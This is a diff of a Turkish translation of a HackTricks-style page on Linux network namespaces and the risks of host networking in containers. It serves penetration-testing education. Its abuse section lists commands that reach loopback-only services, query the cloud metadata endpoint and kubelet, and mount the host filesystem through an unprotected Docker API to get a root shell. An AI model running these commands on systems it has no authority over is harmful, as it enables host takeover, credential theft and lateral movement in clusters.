@@ -1,57 +1,57 @@
-# Ağ İsim Alanı
+# Ağ Namespace
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
 ## Genel Bakış
 
-Ağ isim alanı, arayüzler, IP adresleri, yönlendirme tabloları, ARP/neighbor durumu, güvenlik duvarı kuralları, soketler ve `/proc/net` gibi dosyaların içeriği gibi ağ ile ilgili kaynakları izole eder. Bu yüzden bir konteyner, host'un gerçek ağ yığınına sahip olmadan kendi `eth0`'ı, kendi yerel yönlendirmeleri ve kendi loopback cihazı varmış gibi görünebilir.
+Ağ namespace'i, arayüzler, IP adresleri, yönlendirme tabloları, ARP/komşu durumu, firewall kuralları, soketler ve `/proc/net` gibi dosyaların içeriği gibi ağla ilgili kaynakları izole eder. Bu yüzden bir container, host'un gerçek ağ yığınına sahip olmadan kendi `eth0`'ı, kendi yerel yönlendirmeleri ve kendi loopback cihazı varmış gibi görünebilir.
 
-Güvenlik açısından bunun önemi, ağ izolasyonunun sadece port bağlamadan çok daha fazlası olmasıdır. Özel bir ağ isim alanı, iş yükünün doğrudan gözlemleyebileceklerini veya yeniden yapılandırabileceklerini sınırlar. Bu isim alanı host ile paylaşıldığında, konteyner aniden host dinleyicilerine, host-yerel servislere ve uygulamaya asla açılmaması gereken ağ kontrol noktalarına görünürlük kazanabilir.
+Güvenlik açısından bu önemlidir çünkü ağ izolasyonu port bağlamaktan çok daha fazlasıdır. Özel bir ağ namespace'i, iş yükünün doğrudan gözlemleyebileceği veya yeniden yapılandırabileceği şeyleri sınırlar. Bu namespace host ile paylaşıldığında, container uygulamanın görülmesi amaçlanmamış host dinleyicilerine, host-yerel servislere ve ağ kontrol noktalarına aniden görünürlük kazanabilir.
 
 ## İşleyiş
 
-Yeni oluşturulmuş bir ağ isim alanı, arayüzler eklenene kadar boş veya neredeyse boş bir ağ ortamıyla başlar. Konteyner çalışma zamanları sonra sanal arayüzler oluşturur veya bağlar, adres atar ve iş yükünün beklenen bağlantısallığa sahip olması için yönlendirmeleri yapılandırır. Köprü tabanlı dağıtımlarda bu genellikle konteynerin, host köprüsüne bağlı veth destekli bir arayüz görmesi anlamına gelir. Kubernetes'te, CNI eklentileri Pod ağı için eşdeğer kurulumu yönetir.
+Yeni oluşturulmuş bir ağ namespace'i, arayüzler eklenene kadar boş veya neredeyse boş bir ağ ortamı ile başlar. Container runtime'ları daha sonra sanal arayüzler oluşturur veya bağlar, adres atar ve iş yükünün beklenen bağlantıya sahip olması için yönlendirmeleri yapılandırır. Bridge tabanlı dağıtımlarda bu genellikle container'ın host bridge'e bağlı veth-backed bir arayüz görmesi anlamına gelir. Kubernetes'te CNI eklentileri Pod ağının eşdeğer yapılandırmasını gerçekleştirir.
 
-Bu mimari, `--network=host` veya `hostNetwork: true`'nun neden bu kadar dramatik bir değişiklik olduğunu açıklar. Hazırlanmış özel bir ağ yığını almak yerine, iş yükü host'un gerçek ağ yığınına katılır.
+Bu mimari, `--network=host` veya `hostNetwork: true`'nin neden bu kadar dramatik bir değişiklik olduğunu açıklar. Hazır bir özel ağ yığını almak yerine, iş yükü host'un gerçek ağ yığınına katılır.
 
 ## Laboratuvar
 
-Neredeyse boş bir ağ isim alanını şu şekilde görebilirsiniz:
+Neredeyse boş bir ağ namespace'ini şu şekilde görebilirsiniz:
 ```bash
 sudo unshare --net --fork bash
 ip addr
 ip route
 ```
-Ve normal ve host-networked containers'ı şu şekilde karşılaştırabilirsiniz:
+Ve normal konteynerleri host-networked konteynerlerle şöyle karşılaştırabilirsiniz:
 ```bash
 docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
 docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
 ```
-Host ağı paylaşan konteyner artık kendi izole soket ve arayüz görünümüne sahip değildir. Bu değişiklik tek başına, sürecin hangi yeteneklere sahip olduğunu sormadan önce bile önemli sonuçlar doğurur.
+Host-networked container artık kendi izole socket ve interface görünümüne sahip değildir. Bu değişiklik, sürecin hangi yeteneklere sahip olduğunu sorgulamadan önce bile önemlidir.
 
 ## Çalışma Zamanı Kullanımı
 
-Docker ve Podman normalde aksi yapılandırılmadıkça her konteyner için özel bir network namespace oluşturur. Kubernetes genellikle her Pod'a kendi network namespace'ini verir; bu namespace Pod içindeki konteynerler tarafından paylaşılır fakat host'tan ayrıdır. Incus/LXC sistemleri de genellikle daha çeşitli virtual networking düzenleriyle birlikte network-namespace tabanlı zengin izolasyon sağlar.
+Docker ve Podman normalde aksi yapılandırılmadıkça her container için özel bir network namespace oluşturur. Kubernetes genellikle her Pod'a kendi network namespace'ini verir; bu namespace, Pod içindeki container'lar tarafından paylaşılır ama host'tan ayrıdır. Incus/LXC sistemleri de network-namespace tabanlı zengin izolasyon sağlar, genellikle daha çeşitli virtual networking düzenlemeleriyle.
 
-Genel ilke, özel ağın varsayılan izolasyon sınırı olmasıdır; host networking ise bu sınırdan açıkça vazgeçilmesidir.
+Ortak ilke, özel ağlamanın varsayılan izolasyon sınırı olmasıdır; host networking ise bu sınırdan açıkça vazgeçilmesidir (opt-out).
 
 ## Yanlış Yapılandırmalar
 
-En önemli yanlış yapılandırma basitçe host network namespace'inin paylaşılmasıdır. Bu bazen performans, düşük seviyeli izleme veya kullanım kolaylığı için yapılır, ama konteynerlere sunulan en temiz sınırlarından birini ortadan kaldırır. Host-yerel dinleyiciler daha doğrudan erişilebilir hale gelir, localhost-only servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi yetenekler artık daha tehlikeli olur çünkü sağladıkları işlemler şimdi host'un kendi ağ ortamına uygulanır.
+En önemli yanlış yapılandırma basitçe host network namespace'inin paylaşılmasıdır. Bu bazen performans, düşük seviyeli monitoring veya kullanım kolaylığı için yapılır, ancak container'lara sunulan en temiz sınırlardan birini kaldırır. Host-local listener'lar daha doğrudan erişilebilir hale gelebilir, localhost-only servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi yetenekler, bu yeteneklerin etkinleştirdiği işlemler artık host'un kendi ağ ortamına uygulandığı için çok daha tehlikeli hale gelir.
 
-Başka bir sorun da network namespace özel olsa bile ağla ilgili yeteneklerin fazla verilmesidir. Özel bir namespace yardımcı olur, ancak bu raw sockets veya gelişmiş ağ kontrollerini zararsız hale getirmez.
+Diğer bir sorun, network namespace özel olsa bile ağla ilgili yeteneklerin aşırı verilmesidir. Özel bir namespace yardımcı olur, ancak raw sockets veya gelişmiş ağ kontrolünü zararsız hale getirmez.
 
 ## Kötüye Kullanım
 
-Zayıf izolasyonlu kurulumlarda saldırganlar host üzerindeki dinleyici servisleri inceleyebilir, yalnızca loopback'e bağlı yönetim uç noktalarına ulaşabilir, belirli yeteneklere ve ortama bağlı olarak trafiği dinleyebilir veya müdahale edebilir ya da `CAP_NET_ADMIN` varsa yönlendirme ve firewall durumunu yeniden yapılandırabilir. Bir cluster'da, bu aynı zamanda lateral movement ve control-plane keşfini kolaylaştırabilir.
+Zayıf izole edilmiş kurulumlarda saldırganlar host'taki dinleyen servisleri inceleyebilir, yalnızca loopback'e bağlı yönetim uç noktalarına erişebilir, tam yeteneklere ve ortama bağlı olarak trafiği sniff veya müdahale edebilir veya `CAP_NET_ADMIN` varsa yönlendirme ve firewall durumunu yeniden yapılandırabilir. Bir cluster içinde bu, lateral movement ve control-plane reconnaissance'ı da kolaylaştırabilir.
 
-Eğer host networking'den şüpheleniyorsanız, görünür arayüzlerin ve dinleyicilerin izole bir konteyner ağına değil host'a ait olduğunu doğrulayarak başlayın:
+Eğer host networking'den şüpheleniyorsanız, görünür interface'lerin ve listener'ların izole bir container ağına değil host'a ait olduğunu doğrulayarak başlayın:
 ```bash
 ip addr
 ip route
 ss -lntup | head -n 50
 ```
-Loopback-only services genellikle ilk ilginç keşiflerdir:
+Yalnızca loopback üzerinde çalışan servisler genellikle ilk ilginç keşiflerdir:
 ```bash
 ss -lntp | grep '127.0.0.1'
 curl -s http://127.0.0.1:2375/version 2>/dev/null
@@ -63,7 +63,7 @@ capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link show
 ```
-Cluster veya cloud ortamlarında, host networking ayrıca metadata ve control-plane-adjacent services için hızlı yerel recon yapılmasını haklı çıkarır:
+Küme veya bulut ortamlarında, host ağı ayrıca metadata ve control-plane'e bitişik servislerin hızlı yerel recon'unu haklı çıkarır:
 ```bash
 for u in \
 http://169.254.169.254/latest/meta-data/ \
@@ -72,37 +72,40 @@ http://127.0.0.1:10250/pods; do
 curl -m 2 -s "$u" 2>/dev/null | head
 done
 ```
-### Tam Örnek: Host Networking + Yerel Runtime / Kubelet Erişimi
+### Tam Örnek: Host Networking + Local Runtime / Kubelet Erişimi
 
-Host networking otomatik olarak host root erişimi sağlamaz, ancak genellikle yalnızca node'un kendisinden erişilebilir olması amaçlanan servisleri açığa çıkarır. Bu servislerden biri zayıf korunuyorsa, host networking doğrudan bir ayrıcalık yükseltme yoluna dönüşür.
+Host networking otomatik olarak host root sağlamaz, ancak çoğu zaman yalnızca düğümün kendisinden erişilebilen servisleri açığa çıkarır. Bu servislerden biri zayıf korunuyorsa, host networking doğrudan bir privilege-escalation yolu haline gelir.
 
-Docker API localhost'ta:
+Docker API localhost üzerinde:
 ```bash
 curl -s http://127.0.0.1:2375/version 2>/dev/null
 docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
-Kubelet localhost'ta:
+localhost'taki Kubelet:
 ```bash
 curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
 curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
 ```
-Etkiler:
+Impact:
 
-- yerel bir runtime API uygun şekilde korunmadan açığa çıkarsa doğrudan host ele geçirilmesi
-- kubelet veya yerel ajanlara erişilebiliyorsa cluster keşfi veya yanal hareket
-- `CAP_NET_ADMIN` ile birleştiğinde trafik manipülasyonu veya denial of service
+- uygun koruma olmadan yerel bir runtime API'si açığa çıkarsa doğrudan host ele geçirilebilir
+- kubelet veya yerel agentlara erişilebiliyorsa küme keşfi veya yatay hareket
+- `CAP_NET_ADMIN` ile birleştirildiğinde trafik manipülasyonu veya hizmet reddi
 
 ## Kontroller
 
-Bu kontrollerin amacı, sürecin özel bir ağ yığınına sahip olup olmadığını, hangi rotaların ve dinleyicilerin görünür olduğunu ve yetenekleri test etmeden önce ağ görünümünün zaten host-benzeri görünüp görünmediğini öğrenmektir.
+Bu kontrollerin amacı, sürecin özel bir ağ yığınına sahip olup olmadığını, hangi rotaların ve dinleyicilerin görünür olduğunu ve ağ görünümünün yetenekleri test etmeden önce zaten host-benzeri görünüp görünmediğini öğrenmektir.
 ```bash
 readlink /proc/self/ns/net   # Network namespace identifier
 ip addr                      # Visible interfaces and addresses
 ip route                     # Routing table
 ss -lntup                    # Listening TCP/UDP sockets with process info
 ```
-- Eğer namespace identifier veya görünen arayüz seti host gibi görünüyorsa, host networking zaten kullanılıyor olabilir.
-- `ss -lntup` özellikle değerlidir çünkü yalnızca loopback dinleyicilerini ve yerel yönetim uç noktalarını ortaya çıkarır.
-- Yönlendirmeler, arayüz adları ve firewall bağlamı, `CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa çok daha önemli hale gelir.
+Burada ilginç olan:
 
-Bir container'ı incelerken, network namespace'i her zaman capability set ile birlikte değerlendirin. Host networking ile güçlü ağ yetkilerinin birleşimi, bridge networking ile dar varsayılan yetki kümesinden çok farklı bir duruş sergiler.
+- Eğer namespace kimliği veya görünen arayüz kümesi host'a benziyorsa, host networking zaten kullanımda olabilir.
+- `ss -lntup` özellikle değerlidir çünkü yalnızca loopback dinleyicilerini ve yerel yönetim uç noktalarını ortaya çıkarır.
+- Eğer `CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa, rotalar, arayüz isimleri ve güvenlik duvarı bağlamı çok daha önemli hale gelir.
+
+Bir container'ı incelerken, network namespace'ini her zaman capability set ile birlikte değerlendirin. Host networking ile güçlü ağ yetkilerinin birlikte olması, bridge networking ile dar bir varsayılan yetki setinin birlikte olmasından çok farklı bir duruştur.
+{{#include ../../../../../banners/hacktricks-training.md}}
